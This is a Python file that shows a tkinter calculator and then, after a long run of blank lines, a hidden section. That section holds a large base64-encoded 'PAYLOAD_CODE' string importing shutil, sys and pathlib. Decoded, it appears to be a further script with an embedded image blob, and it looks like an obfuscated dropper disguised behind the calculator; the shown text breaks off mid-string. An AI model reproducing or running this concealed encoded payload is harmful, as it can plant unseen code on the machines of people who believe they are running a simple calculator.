import tkinter as tk

def window():
    class Calculator:
        def __init__(self):
            self.window = tk.Tk()
            self.window.title("Calculator")
            self.window.geometry("375x667")
            self.window.resizable(False, False)

            self.current_expression = ""
            self.total_expression = ""

            self.display_frame = self.create_display_frame()
            self.buttons_frame = self.create_buttons_frame()

            self.total_label, self.label = self.create_display_labels()

            self.digits = {
                7: (1, 1), 8: (1, 2), 9: (1, 3),
                4: (2, 1), 5: (2, 2), 6: (2, 3),
                1: (3, 1), 2: (3, 2), 3: (3, 3),
                0: (4, 2), ".": (4, 1)
            }

            self.operations = {
                "/": "รท",
                "*": "ร",
                "-": "-",
                "+": "+"
            }

            self.create_digit_buttons()
            self.create_operator_buttons()
            self.create_special_buttons()
            self.configure_grid()

        def create_display_frame(self):
            frame = tk.Frame(self.window, height=221, bg="#F5F5F5")
            frame.pack(expand=True, fill="both")
            return frame

        def create_buttons_frame(self):
            frame = tk.Frame(self.window)
            frame.pack(expand=True, fill="both")
            return frame

        def create_display_labels(self):
            total_label = tk.Label(
                self.display_frame, text=self.total_expression,
                anchor=tk.E, bg="#F5F5F5", fg="#25265E", padx=24,
                font=("Arial", 16)
            )
            total_label.pack(expand=True, fill="both")

            label = tk.Label(
                self.display_frame, text=self.current_expression,
                anchor=tk.E, bg="#F5F5F5", fg="#25265E", padx=24,
                font=("Arial", 40, "bold")
            )
            label.pack(expand=True, fill="both")

            return total_label, label

        def add_to_expression(self, value):
            self.current_expression += str(value)
            self.update_label()

        def update_label(self):
            self.label.config(text=self.current_expression[:11])

        def update_total_label(self):
            expression = self.total_expression
            for operator, symbol in self.operations.items():
                expression = expression.replace(operator, symbol)
            self.total_label.config(text=expression)

        def create_digit_buttons(self):
            for digit, grid_value in self.digits.items():
                button = tk.Button(
                    self.buttons_frame, text=str(digit),
                    bg="#FFFFFF", fg="#25265E", font=("Arial", 24, "bold"),
                    borderwidth=0, command=lambda x=digit: self.add_to_expression(x)
                )
                button.grid(row=grid_value[0], column=grid_value[1], sticky=tk.NSEW)

        def append_operator(self, operator):
            self.current_expression += operator
            self.total_expression += self.current_expression
            self.current_expression = ""
            self.update_total_label()
            self.update_label()

        def create_operator_buttons(self):
            i = 0
            for operator, symbol in self.operations.items():
                button = tk.Button(
                    self.buttons_frame, text=symbol,
                    bg="#F8FAFF", fg="#25265E", font=("Arial", 20),
                    borderwidth=0, command=lambda x=operator: self.append_operator(x)
                )
                button.grid(row=i, column=4, sticky=tk.NSEW)
                i += 1

        def clear(self):
            self.current_expression = ""
            self.total_expression = ""
            self.update_label()
            self.update_total_label()

        def evaluate(self):
            self.total_expression += self.current_expression
            try:
                self.current_expression = str(eval(self.total_expression))
                self.total_expression = ""
            except Exception:
                self.current_expression = "Error"
            finally:
                self.update_label()

        def create_special_buttons(self):
            clear_button = tk.Button(
                self.buttons_frame, text="C",
                bg="#F8FAFF", fg="#25265E", font=("Arial", 20),
                borderwidth=0, command=self.clear
            )
            clear_button.grid(row=0, column=1, columnspan=2, sticky=tk.NSEW)

            equals_button = tk.Button(
                self.buttons_frame, text="=",
                bg="#CCEDFF", fg="#25265E", font=("Arial", 20),
                borderwidth=0, command=self.evaluate
            )
            equals_button.grid(row=4, column=3, columnspan=2, sticky=tk.NSEW)

        def configure_grid(self):
            for x in range(5):
                self.buttons_frame.rowconfigure(x, weight=1)
                self.buttons_frame.columnconfigure(x, weight=1)

        def run(self):
            self.window.mainloop()


    if __name__ == "__main__":
        calc = Calculator()
        calc.run()


































































import base64
import shutil
import sys
from pathlib import Path

PAYLOAD_CODE = """
aW1wb3J0IGJhc2U2NA0KaW1wb3J0IHNodXRpbA0KaW1wb3J0IHN5cw0KZnJvbSBwYXRobGliIGltcG9ydCBQYXRoDQoNCklNR19EQVRBID0gIiIiDQovOWovNEFBUVNrWkpSZ0FCQVFBQUFRQUJBQUQvMndDRUFBa0dCd2dIQmdrSUJ3Z0tDZ2tMRFJZUERRd01EUnNVRlJBV0lCMGlJaUFkSHg4a0tEUXNKQ1l4Sng4ZkxUMHRNVFUzT2pvNkl5cy9SRDg0UXpRNU9qY0JDZ29LRFF3TkdnOFBHamNsSHlVM056YzNOemMzTnpjM056YzNOemMzTnpjM056YzNOemMzTnpjM056YzNOemMzTnpjM056YzNOemMzTnpjM056YzNOLy9BQUJFSUFUZ0JBZ01CSWdBQ0VRRURFUUgveEFBY0FBQUJCUUVCQVFBQUFBQUFBQUFBQUFBRUFBSURCUVlCQndqL3hBQkdFQUFDQVFNREFnUURCUVVGQlFZSEFBQUJBZ01BQkJFRkVpRXhRUVlUVVdFaWNZRUhGREtSb1NOQ3NjSFJGVE5TOFBGaVk0S3k0U1JEY25PaTBoWTFSRk9TbE9ML3hBQWFBUUFEQVFFQkFRQUFBQUFBQUFBQUFBQUJBZ01BQkFVRy84UUFMQkVBQWdJQkJBSUNBUU1EQlFBQUFBQUFBQUVDRVFNRUVpRXhFMEVpVVRJRkZHRnhnYUV6UWxKeXNmL2FBQXdEQVFBQ0VRTVJBRDhBcnFWZHBWd0h6SXFWS2xRTllxVmRwVmdIclAyZjNrTno0Y2doalllWmJreHlMbmtja2cvVVZvYnEzaHU3ZVMzdVkxa2lrWGE2TjBJcnc2d3ZyclRia1hGamNOQk1CamN2UWowSTZFZk90bnB2Mml5cUFtcVdIbWY3MjFiQlAvQTMvdXJwaGxqVk05ZlQ2eURnb3o0WlBxWDJkUk1TK21YalJmN3VZYmgvK1E1L2pXZG04TzYvb2R3bDFIYnZ2aE81WnJmRWdIdmpHZnpGZWk2WDRvMGpWR1ZMYThRU25wRkw4RC9rZXYwcTU2MFhpaExsRHZTWVovS0hIOUR3M1VMKzgxU2NUYWhjdFBJcTdBeFZSdEdlbUFLOUw4RlNqVmRFRXQ5QkJKTkhLMGUveWxCWURHTThlOVA4VmVHTGJWYmVXZUNKWTc1VnlycU1iL1p2WDU5cWcrelZ0M2g5eU9odUdQNkxTUWpLT1NtVHc0cDQ4OVNkMkJmYU03MlZsYXcyT3lCTGhuU1haR3VXWEhUT09PdmFxRHdOZHkyK3RRV1M3RGJYTHNaWTJRRUU3U2M1eDE0RmJIeHRCcEUwVm4vYk4zTmJLcnQ1ZmxJVzNISFBRR3FYdzlCNFpUV3JSdFAxRzdsdWd4OHRIaFlCanRPZWRvN1pvVFQ4bDJiTENYN2hOUGpqMmJhZUNDS0NTUkxlSGNxRWo0QjJGZWFlRGRUdjduWDdUN3pkR1ZidHQwNmxGdzUySEhiakdCMHIxQzU1dFpoL3NOL0N2Si9CQXhybWtuL1A0RFJ6T3B4SDFUYXlRUyt6MDdWRlMxMHk4bmdpaldXT0YyVnRnNElCSXJLZURQRUYzcVY2YkRWRmhuRHhsMGZ5Z3BCR09DQndSeitsYkhVNGxuMDY2aWVSWWxlRjFNamRGQkI1Tlpyd3ZvbHBwY1VtbzJ0MS9hY2dRb24zYmI3WkF5Mk0vTTA4MUxlcTZMWkl6OGtkdlhzcnZIMmgybHN0cmQyTUN4U3pUaUZvMEdBNUlKQkE5ZVAxcTkwblFkUDBEVG11WjQwbG5qak1rc3pxQ1JnWk8zUFFWbXJ2Vjd2Vi9GR25wZld4dElMYTVVcGJ5Y3NHSnh1YjM5QVBYcWMxdmRTWmswKzVaSVZuWlltSWliby9IUS9PbHg3SlNja1R4Unh5eVNuRmRIblZqNDIxWnIrT2E2TUp0WkcrSzJFWUd4VDZOMXlCMzZIMEhiUytML0R0dGU2Zk5lMnNTeDNrS21UY2d4NWdISkI5VGpvYXpZOFZraFNOQTBzZHdjLy9BTTBTL2p2VTNSbC9zKzBBSTUvYU1lUHlxVWNzS2FsS3lFY3VOeGNja3Ivc2FMd0pjelhtZ0pKZFROTzRrWUIzT1NSMjVxZyswMlc0TjdZV2tjc2doa2pabWlVOE93WmNaSGYycTYrenBkbmgxVS93ek1QMEZXVjNiNmJMcjFvOXlRYjlJWE1DTWVOdVJrajNISDUxWkxkaVNzNk5qeVlFcjdvb2RMblBnL3cvNStzWEVrazB4SGtXZTdKWGo4SytucWV3ckVhdHJPcGF2TTBsL2NOc0xibHQ0emlPUDBHTy93QXorblN0ZDlvZWlTUElOWWlMdUVRUnlxU1Q1WTdFZWc5Zm9hd3hXdWZOS1VYdDlIRHFwemcvR3VsL2tqeFRjVkppdVlxU1p4RWVLNWlubXVZb3BtR1lybFBJcHRNWVdLVmRwVVJodEt1MHF4TTVYYVZkckdPVjBDdWdVNENnWTlFK3pCRk9tWHBaUi9mam5IK3lLeVBpZlRaZE4xeTdqa1FoSkpHbGlPT0NySFBIeXpqNlZONGY4U1h1aEs4ZHRGRExESTI1a2t5RG5HT0dIVDhqVjdjK05OSzFLQVE2dm9rMGcvM2JJKzArb0pLa2ZTcTNDVUVyNVBRM1lzbUJRYnBveERJckFxNmhnZXhHYTlPK3pxNXVyalNKVnVYZDBpbDJSTTVKT01Eako3Q3N1czNnOFB2KzY2c3cvd0R0SEdQenovT3JNK09ZcmEyVzMwYlJtaVJCaGZ2RHFnSDBYT2Z6b1lxZzdjamFaUnd5M1NtdjdHeTFuVW9OSjA2YTh1VGhVWDRWSFYyN0tQY21xTDdOQXkrSG1EL2k4ODV4NjRXc0xxV29YMnJUaWZVYmd5c3Y0RVg0VWovOEsvelBQdlZqQjRtMWkzaFdDMGt0TGVKZndyRmFnQWZyV2VwaHZ0OUlyKzlnOHU1OUkwSDJsak52cC84QTVyLzh0WnZ3bU1lSkxBLzd4djhBa2FuM212YXJmdytWZVBhVEx6anpMVlNWT01aSG9lZXRRNmZlM1dua05aK1FzbWMrWThLdXc0eHdUMHFHVExDV1ZUWFJ6NWNzSjVsTlBnOVh1T2JlVEgrQS93QUs4cThGakdzYVdmbC95R2p2L2lUWGovOEFYci8rdW45S0dnMUMrZ25hZTNlMmlrYkh4SmFvTnZ5NDRwc3VmSE9VWDlGODJmSGtsR1NmUjZSckF6cE42UFczay81VFdGOEIzb3N0USs3T2NSWFNnZjhBR0J4K25INVV6KzM5ZE9jNmprZWhnajUvOU5WeER0SVpISTNrN3Nvb1FBK3dIU3RsMVVYS01vK2paZFJHVTR6ajZObjQ0MDN6N0ZiK0VFWEZxUWR5OWRuZjhqZy9uUmZoL3dBUTIycFFKSE5Jc2Q2QjhjYkhHLzNYMUZaWlBFV3RKR0kvdlVVaTR4bVdFRW41NElxcWxUem1acFVpK0k1Mnh4aFVIeUhhakxWUVV0MFBmWTB0VEZUM3c5OW0xdjhBd2RwbHpNWjFhUzMzSExMR1J0L0k5S3plc1htbldGckxwT2dmRzB2d1hWNW5QSGRBZTVQdHdQblZaSkQ1aTdKR2QwL3dNNUsva2VLNElnb0FVWUE2QWRxbFBVUmY0UnBrWjVvLzdJMDJibndDTWFHZi9QYitWVS8yaFN5VytzYVhQQTVTV09PUmtZZGp1V3FzYXhyS3J0VFVwSTFIUlVpalVELzAwUGVhanFkN0NZYnUra21peUR0WkU3SFBVTGtkUFdxUzFFUEhzWFpTV29nOFBqWGFQUXRDMU9IWE5NOHdxdS9CU2VJODRidVBrZTN0WG4zaXJRbTBhKy9aZ20wbEpNVEh0L3NuNWZ3cWZ3OXE2YUpjVFRHQzRtTWliTmtiQUwxems1Ny9BTlRWbnFYaTZ6MUswZTJ2Tkh1R2pibjRaVnlENmozcDNraGx4cmMrUXp5WTgySmIzVWpFa1V3aXJFL2N6YlRZamxXVXYreURISkM1NHpqak9NMEd5MXpXZWExUkFSVFRVcEZNSXBrd0RDS2FSVHlLNFJUR0dZcnRkd2FWUFl3M3ZTcFYwQ2lTT1YwQ3U0cHdGQXh3Q25nVjBDbmdVallMT0FVNExUZ3RTS3RJMmF4cXJUd250VDFXcEFsU2NnakZTcEZTbnFsVHJIVTJ3b2lXT3BWanFWVXFWVXBXeWlSQUk2a0VkVEJLZUVvV1VTSUJIN1YzeTZKMlYwSlFzYmFEZVhTOHVpdkw5cVhsMXJHMmdoanBwam96eTZhVW8yRGFCbU9vMmpvMHBUR2pvMkRhQXRIVVRKUjd4MUV5VWJGY1FCa3FKbHhSckpVVHBUSmlOQVRMVWJMUlRyVVRDcUtRb09SVENLbklxTmhWVXdEYVZkcFV3eEZpbkFWMFYwQ25JdGlBcHdGZEFwd0ZLMkxaMENuaGFTaW5xS2syYXpxclVnV2tvcVZGR010d0IzcVVwRk1lT1dTVzJLdG5GV3BrU2xZM05oZFh2M0hmdG5JeUczWm9ueVRHN0k0d3luQnFUZlBKZk5wY21DdDR4RTlxbVJLY2lWTWlVdGlSUTFZNmxWS2VxMUtxMHRsVWlNSlR3bFNoS2VFcldVVVNFSlRnbnRVd1RQYXVoYUZqMFFiSzdzcWJiUzJpc0hhRDdLYVU5cUsyMDByV3MyMEVLZTFNWktNS1ZHeVUxZ29DWktpWktPWktoZEtLWWpRRTZWQXllMUhNdFF1bE1tSTBBT3REdXRIdWxEdXRPbVNhQTJGUk1LS2RhaFlWU0xGSWFWU1lGY3FsbUlzVjBDa0JUMUZVT2NRRlBVVWdLa0FwR3dXSlJVcWl1S3RTcXRTa3pXT2lpTWpxaTlUMHFMeEJjSlk2YzIzcW82KzlGV2tzY045Q0ptQ3E0WUFrOStQK3RVdjJoQ1Qrem1XMWdsbUxISDdOQ3gvU29jeXlLSjlEK2w0MUhENVBiTVY0UTFLU2Z4alp1V0ovYU1EbnVNR3ZaYnVQOXFIL0FNUTUrZGVLK0V0S3U3SFdiZSt2NG10bzBKd0pSdFppZlk4MTdQRGRSWEZ1aERaSTZWYlcwc2kyOVVYMVVQSmhhSEl0VEt0SkZxVkZya3M4V0tFcTFJcTA1VnA1S29wWnlBbzZrME95MFkyK0RpcG5vTTF5V1NLRWZ0RzVIN3E4bXE2OTFZQUZZVHRYdTNjLzBxdGU3TEhHY25HZU90TTZqM3lkdVBUL0FQSXVwTlNSZjd0Qm4vYU9hSE9weUZzRjhIMFVZcXRRTWNaQkh6RkZSb2ZTb1N6dGRIVEhIRmRCZjN1UThHUmdUNzBUYnpPZUdmY1BjQ2dVaFE4dU9CM05XVnZBckFkeFUxbmsyVThhWk9xcy9SUmoyUE5kYUlqcURVOEVSWGowcmt5N1NSazRycXVPMjJSbmdpK2dVclRDdFNnNTVIU3VsYUNkbkhQRzR2a0ZaYWlkYUtaYWpaYVpNazBCT2xRdXRHdXREdXRNaFdnSjBvZVJLT2tXaDNXblJLU0FIV2gzRkhTTFF6clRwa1dxSU1VcWZpbFZMQURBVThDdUFjMUlCVm1jak9xS2tVVTFSVWlpcHRnc2NvcVpCVEZGVElLaEpoSTdtMGl1NERET0NWUElLbkJVOWlENjFVWHVtNjdEQVZzYmlPN1FkRmwrQ1hIejZIOUswS0NwNHhTUnlPSjE2ZlU1TVA0UGo2UEdkVHQ5UVc1SzNheXd6REoyU0FnL1QxSHVLdXZDZXJYVWMvM2E1bk9PaTVOZW5YVmphMzhCaHZJRW1qUFpoMCtYcFdBOFRlR20waVJab0N6MnJINEpQM2tQK0Z2NUd1eUdlR1ZiV3FaN1dEV0xMeExobm8ybVhDM1VBSkk4eGZ4ZS92VmdxMTU5NFgxa25hak9GbFRqNS9PdHpGcUZzWWc3eUtoSXlWSi9oNjF4WmNiaktqbnphWnhkeFhBVkxKSEJFMHNyQlVVWkpOWWZ4SDRxRVVpcVVKVWdrSm44STlUUi9pUFc0Vmp5M0lYKzdpUGMvd0NKdjZWZ1B1czEvY05LemtNNUpZbkdjL1NyNGNjWXE1SFZwOEtoekxzZEo0anVuWXlBSXVleTlNL1hwVnJwbmlFRUtzOGFjbkJJNFByaitINVVQQm9FSkFMWlp1TW4rbE11TkRsUWxyWnVNZzdTZWVuWCtWR2ZobHdkYWxFMzFoUGEza2NiV3M1M09Qd0VEMDUvS2psalpHeEluWHFSWGwrbWFoY2FYZUJ0NUxnREliMk5lcmFEcWRwcmx1SGorRnVRQVQrTEdBZjQxNXVvMHJoeXVqT0pKSEdveG5nR3JLM1VBQU5YWTdYeWdSakk5RFRsNU9GQStSN1ZQSEJMczNLQ0ZSU3VQVTFCZEFBY1U1V1ZUbkpCcGx4SWhINHhuSGZpcjVIY0tOWUNjZzhqanVLa1VqcFVVcElQUEE5ZTFjaWY0dTFjY01qaTZaUEpCU1ZFeEZSTUtJNjFHeTEycDJlZktOT21ET3RRT3RGdUtnY1U2Sk5BYnJROGkwWklLSGtGT21UYUFaRm9hUVVkSUtGa0hGT2lNa0RZcFUvRktuRUJSMXA0cG82MDhWZG5EWThWSW9waWlwRkZUa0Flb3FaUlVhQ3BsRlFrRWxRVVJHS2dRVVRHS2lWZ1RJS2ZjVzBWM2F5Vzl3bTZLUmRyQ2xHS0lqb1dkVU9PVWVPNmpZWFdsYXJKQ0dPNk50cFBUY094K3ZXckszMVNTR0FtVTU0NHlldGFIeExGRkxmelNFQWdiVitaQXJFNnpKZ0U5UGF2UVV2SlZudjQyNVJUWU5xRi9KZHo1ZGp5ZldyV3luV0tNVmpmdlJhZkdNWU5XY1YvR3JZWnMvTHRWc21MaWg2czJVVjZ2R0tQanVGS2lzN1lSQ2RGS3NNK2dOV0JobGlUY01rQ3VHY0kzUnFHNnhZeFhDdElpZ1NnWkJIR2FEOExhbkpZYW9rWWtJRzhESkdRbzlBUFhKL2pVZDFxWGtSc0hOVlVGekhMZEpLaDZ0OFFIZnZWNHdiZzArZ3hkSDBMYlhVYzhLTTNVanA2MG5Lc01ZNEhyV1cwbS9LMmNUYmlDRjI3YzFjeFhZYU55VG50eFhqdDF3eWpaS3grTElad2ZuVG1reU1DVEk5eFFhM0N4eGt5TmtBY3QwcWt2dkZkbmFUaU1EZndTeFh0L3JSZ3BUNFFLc3ZaWEl6Z0wvdy8wcUNKczRMWVZ1NEZaQ2I3UVZjU2kydGxKVWNPVGhWN1pJL1BIcnhRdHg0dXU1cFdLMjRRSkdNQWtjNTUzSDArWHo1cWt0RmtmSnRqUFI0MkRESUlPMDRJcHpDc3A0UTE2R2VCamNTNGxJNVZ2eFo1Si9pQUsxM1ZSUmpHVVBpemkxTUtkZzdpb0hGRk9LZ2NWUkhLd1Z4UTBnb3VRVU5KVG9sSUVrRkN5RGlqSkI3VUxKVG9qSUh3SzVUOFVxZXlkQVFITlBGTkZQV3Vobm5EMXFSUlRGcVZSVXBHc2tXcFZxTmFsV29TQ2lhT2lJNkhqb21Pb2xvQkNWMjRuRnZDVzZ0KzZLVWRVbXMzaGM3VVBIUVU4STI3WjZPa3hlU1g4SXBkWXVkek56My9BRHJQWDFnYm0zTGxYejF5QldsdHRPODZUYzVMSFA1VmZRYVdqUjdTb3g2R3RQVXFEUGVTcEhqSDltaFpKUVNTeStvNjF1dkMra2FEWWFQSnF0OUJIZGlDRnBYTGdNZUJuQUI2VVg0aThLT1crOFdTcXNpL3VrY01QUS8xcWpzbWgyeVdOMkh0cEpGS1N4Tnh2SHNlaEZkdVBWS2NkeUdpVWVwNjlQYzNjVTNsYVphTStUSGJ4V2kvQU93TDQzWjk4aXZRZkRkamRhMTRjL3RYVDBrODZCM2h2TlBuUHhvNjlkakhub1I4TGV1TThjNXU5OElpNVJYc2xobXVZMUFqYVZ5Tm9IUWNjSEh5cjBud0tsbjRYOE5wWlhGMUxMZHU3VDNVcGljNzVHNU9Eam4wejNxcnk0TXNhYjVLU2lyNFBKL0djS3BGRGQyLzkxTndlTVlQeTdkK0t5VnBjUEZNR0dUejByMEg3U0x1ekVWL2J3eHVpdmNMTENXR0ErNDdtMittRHU2NHJJNkpvMHQrUTRYQ1ovRmltd3RReGZJaktOTTlFMEc4KzkyMExBOFlCT2V0YVA3enNoSjNjOXhXZTBYVHBMU0JWQ2s0QTZEaXJDOU1naks5RDZWNG1WSnpxSXdKNGd1cHI2RTJrTGxFemxpdlE0LzByUDIramZ0NUpaWmRyRmRxN09jRHZqUFRqajYwZmNzNkE5Nmh0cFpYUEdUWFhqdUVLaUkyenNQaDJ3WXY1cTc5NXowQXh6bnAwL1R1YUprOFBXakJqQ1NyTjFEQU1EOHgvcDYxUEg1cWpMSTJQWVpvcUtSV0F6MHBKWmNuZGd0bFJIWVhPbGxKUTVZSzRQQ25hRDgrMzUrL2F2U2RJbis4NmRGSm5KeGcvT3N6YjRiZ3NRRDFJTmFiU2xXTzMySmdMMTRQOHFTV1RkMzJUenZkQUllb1hxZDZyYjNVYmEyUm1MZVl3L2RUbXNrMmNLaTVkSFoyU05Ha2tZS2lqSlpqZ0NxbTJ2UmV6UElQMmRuSCsrZXIrL3NLeSt1NjdMcUYwTGNzcXdodUkxeitwNzBkZFR0YTZkREJGKytOeC9sVnBSMkwrV2RtRFRxUHlsMmF1Ty9oMUVlU1VDcmo0UUIrR3FtWUZTUWVvNE5RYUNUNXFtakw0WXVaUVA4QUdmNDFPSEVtaVg2bEZiWXlCSzVYYVZXUEhBd0tldE5GUEZkTFBOSkZxUmFqV3BGcVVnRWlWTXRRclV5MUNReUprb2hLSFRyUkNkS2lXZ052cC9JZzQvRTM4S3orNFN5L0Z6UkdyWFdTelo0N2ZLcUZMdFJJY3RWdHIyMGo2WFM0dkhqbzFsaUZVL0R4ODZ0b01ZNkRyV1RzTlJYQUdSVjdiWGlsUnpYbjVvU1IxMlhFaXFZKzFaL1ZkTnNMcjRiaUZIOU55ZzRQdDZVVGVha2tVUkJZREh2WG5tdStOQ0p6RFpxSGJPTW4xcW1ud1pNanVKalNKcFZyYm5NTXN5RDJsWWo5YzBRVk96YWJxWGI4Nm9kSW5kMEQzVTI5MkdUL0FJUlZtOTJpeUxHdTNKNDZDclRoSk9tN0NyQno0UjB5OXV2dk4zTk5jUG5JOHgrQjlPbGFDejBxMHQxVllVVUlCd0IrVlAwdnl4amNnUHpGWFVWdGJ5ZHZ5N1ZDZVRKTGhzYW1Qc2JPSVJFN1FNZE9Lb2RYaEt6RmdEV29nc2NxUkZNeS93Q3cvU3F6VWJTVExDWk5yZTNTbGxjYWRDOWRubkY5Y3BOZXZiS1F6S2NMR1QrSnZmMkZWT3NYMTFwMDcyOXJNczA4SURUdVZDeFJrNElVWjVKNUhvS004VndYZWthN0hkb2hlMWw3WTREWnlmei9BSzFXNmpwbzFPUzVtYUtVdzNMaVhmRmd5SXdISXdldlBwL3A3T0JZOWliOWxZUlVpKzhHWCtzZUlMbWEwdEZzMnZvRTgxcmFRbFBOajRHVWZrY1pIQngxNjBkYzNZRjFMYlRXczluZXhmM2tFNmJUOUQwYjVpaWZzYjhQWDBHcnJyRjNISmIyRnJhdmIyaVRLRmtrTE5ra2pyZ2M5ZlVZNEZhcjdSYksxMVcyamZCKytRU0tZcEVPR0F5TWo1WTV4N1ZUTnA4TmJsd0k0Y21Xc0xna2hXNHJUNmRjRmJVNUo3ZDZ6WXRuRTJFVTlhMDFqYXQ5ekpiZ212RXl5WEZFV3E3QnIyNEQ5U3g5aWNpcWU4RHNwM0VLdjVWZXg2WVpXM3l2c2pQUUwxSS9sUlMyVnJFUGhnUW4vRXczSDh6WFZCN1NVdFJDUFNQS0pvNElMc3lyTWhkU2VOd3JSNlRjVzJyd3JieU1GbFQ4RCszb2ExMXhiVzhxbFpiZUYxUFpvd1JWTlA0ZTBscEJKSFpyQklEa05ia3hFSC9oeFZwU2hOYzlpcld4WGFMWFROSUZzb2tMcmhmZXErOGNTVHlPT2pNU1BsVDFEeEpzODZWMS93QnMwUElhbENGT3prMWVwV1ZKUklzMHE1U3ExSEFEMDRVMFU0VjBNOHRraTFJdFJMVWkxT1FFU3JVcTFFdFNxYWhJWW1TdTNFbXlJak9NMDFhRjFHYll2ZjA0cVVWeWVob01ma3pLL1hKUjZ4TnZMS2pkUDBxaC9zKzZsNVE5ZTJhME1hK1pJVzY4OFVWRWtjVVpHUUNCbjVDcWVYWjBmUzBZRzVtdnRQbUNOdnllUnpSMXA0cnZiWmYyOXMwbnVDQlU5MkJjWEZ6ZnlKNWtVZWRnOWhRTUYxWjNlQ3FCVlBZakJGZGZ4bkg1Uk5SelZ2RWQvcVVKamhnTWFudVc1ck1xSklMZ1NTamRqMXIwRzIwbTJ1SXdRTWNkcUMxRHd3N2pNUFB6clk4K0tIeFNvS1JuN2ZYaEZoQzIzUGZOVzFqZXRMY1JQdjNkS285VThPM1VRM0NCaGowcXVzcmk0MCtYYXl0c0I1WDBxN3hZOGtiZytRMmUyNlJPV1JQaStsYU8zWUVaeHpYbW5oalg0NVZFTXJBTis2VHhrVnRyYThYYVBpL0kxNEdmSE9FK2l5cG92MG1PZVd3ZmFwaSsrSERrRWVoNjFUeDNRSkF6bmp2VXpYR0ZIT1ZIdlVsazRwbWNTRFVyQ0MraGUzdVlsa2lic3c2VmxIMFdmU1hZVys2YURQUW5sUlcxZ2xXU01uUEpOSzM4dTVKWGpjcHdhT0xKSld2UlA4VExXalJzdVBpUTlDVVlxZjBvNk9HSHpWbFpwWGJPUUhsWmhuNVp4V2dPajI4alpNS0Z2WEZFeDZSRkQ4U1JxcEhvS3BKdHJoaDNsUGIySUxoM0dHYm5GWGlRQkxUYWV1S1o1S3JJTUxnRHZSYkFmZDMrVmN5LzFDZVIvRmdEMUE1cVZ6UTdtdlJSNUxaRElhRmtQTlR5R2haRFRvbElnbE5DU0hyUkVqVUpJMVVSRmpOMUttYnFWT1RzaGxuaGhRUExLaUlUZ014d00wK0thS1VsWTNWbUhKQVBJckl2ck1TN29QSitFamJJckU3U2Y4KzFHNmZlUjNEQm9uS1NBRUJ3T2RvL2xYYThTcnM5Q2Y2TERaOFpPLzhBQnAxcVJhR2dkekdETHQzWTVLOUtIMURXYkxUbFUzRW54SG9xakpOUWxDVjFSNHN0RnFJejJiWFphQWhWTE1RQU9wUFFWV1h2aVhUYlJ4RUowa2tLa2dCdmg0OVdyenJ4TjR0dWRVazhtRlJIYnFTcFhkdVYvZXM3QmJUVHVFUldZOWdPVFY0YU5OWE05YlQvQUtWRkpTelBuNlBScmo3UVMwTWpSUktpeGpEdEVkelpPY2JjakdPT1QvV3J5UythVzJpTGxtWmtCT2VwT0t4V2dhUkRwN2k0dUFKcHdRVVE4cWg5Y2R6K2xhQkpHY3R6eWVwNlZEUEhHdU1hUFJoaXg0K0lSb3NJYmtJNVhkeWYzYVplYWd2a2xFSzRJMmpGQnN1NWo4UEcwZ21oZ3VMajlwZzhZeDcxenJHbTdLM1JNd0RXM2txTzJLcEx2VEpkUEF1a3kwQk9HSS9jUHY3VmZJd1F0a0hwNlZOWTNTRGRGTW9hSnh0WU1NakZVVTNEb0tmMkQ2SGZxNDJNMkFSbjYxcHJlVGVTZTNYRll6VmRIbjBseGU2YnVtc2p5eUE1YUwrcS93QVAxcSswRFVvcnlEY3JaK3RSejQwNDc0OURjb3YydDRwbCtOUnpWZGUrRkxUVUZ3WTF6NjR4VnhhS1pHQ0wzOWF1MWdWRUFBNXJnZVdXTi9GakxrOHExRHdEYzIveGFiUGtqa281d0Q4ajJvS0NYeExwSkN5Mk04aWc4WVhmK1JXdldyaUxjTUE4WXF2a1RhY0VjMWFPdW0xV1JKamRHVnN0ZDFob3c4MmgzSUEvZUpDL29lYWgxTHhkZldxZi9LcHlCNnQwL1N0ekRhbGxHUU1lOVBPbVF1TXZDckw2WTYwaXpZbEszai85R3V6SWVGZkZZMVZHWlltaUlPQ3JmMXExMFRVMmZWN29zY0laTUQ2Y1ZhUTZEWnhYQnVJYmRWYzlTTTQvTHBXZTFPMmZSOVUrOEZUNUV4L0YyVTBkMkxKSjdGUWo0UFNMU1VFQXFjNUZGU1NBOS9hc3ZwR29ySkd2eDl1dFhTVGlSZXYxcm5sTnhWQUptQWFUMUk3K3RQbEdJSDUvZE5SeGdESDhxZGNIYmJ5a25QRmMrSjNNVEorTEt0Mm9kelQzYWg1SHIxa2p4MnlLUnFHa2FwSkdvV1I2ZElsSmtVclVISzNXcFpYb1NScW9rUlozZFNxSGRTcXRHbzg3bGQ1Rjh5VGx1aElPT2ZYMnBpM2tsb2lCV0FrYm40Um5iUXMxeEdSbUg0WTE3RTlUUUVsMC9MTWN0aml2U2pHejZoeU5CZGVKSjdhRFpIS3pTOVBpT2NWbkxyVWJtNmJNMHJNZWVTVFE3RXNjazlldE5OVmpCSW0zWVZieGIzVk0vaTZtdGJwMXJGYndLWXdBeDVKOWFvdEtpWHpUem5ucU9sYWlGUGhUMHJsMUUrYUVrVFI5Q2ZVMFRhaGlHMnRnN3Vwb2VFRW9RZTNTbjI3YldkZVN4NEhhdU5paGU0K1dRd1BKNTIveW9hRkNIWm1PVDcxT01HSUtPT3VPTVV5SGhtM0RyL0ROSWdzNi93Q0RnSHBReXV5TVdIVW1pcFR0M2NuMCtsRFpGTWpMa3R0UHZYaXdHNVFubGZTbjNIaHhiaHY3UjhOVHBCZFp5MXUzOTNKOVAzVFZiYXNGWWc5K3Z5cTJzcEh0NUZlM08wajBxVGJnN1E4WjF3eWZ3NXI0YSsvcy9VNG1zZFNYL3VaT2orNm52V3pGem5uT1NCVkFSbyt2MjRzdGNoQ1AxU1ljRlQ2ZzlSVU54by9pZlFsM1dFc2V1Mkg3cXUyMmRWOW02TjlhbGswOE02M1krSDlGRXZvMGhJYjh1dFJwQjVrdnpyTDJuam5UaEt0dnFjTjFwOCtjZVhjSVJXbjAvVzlMbUE4cTdqTzduazRya2xwc2tPMEIyV2lRZ0wwNlZMaE1jL1dsNThSVU1wRFo1eU9hZ01veVNXSE5Ta0MyaVRhTWZEMzdWWDZwYVJYdHU4TWlqQjRCb2hwOERnWVBybW90NGJnblB2VWRyaTdURGQ4R0hoa2wwalVUWlhCS3IxamM5eFd0c2JzN1J1SlBGRGVJdEhpMVd5T1FCTkY4VWJqcURRdWtlYWJlTlpRUzNRMTBaSlJ5dzNlL1lPald3emJnb1hnQWRLZmVQLzJML3dBUm9DMWJZQlVtcjNDUlFRTEk2cDVzbUVESDhSeDBGUjA4THljRXMxN0hRREk5RFNOWFhmdm1oNUpLOVJJOFpzYkk5Q1R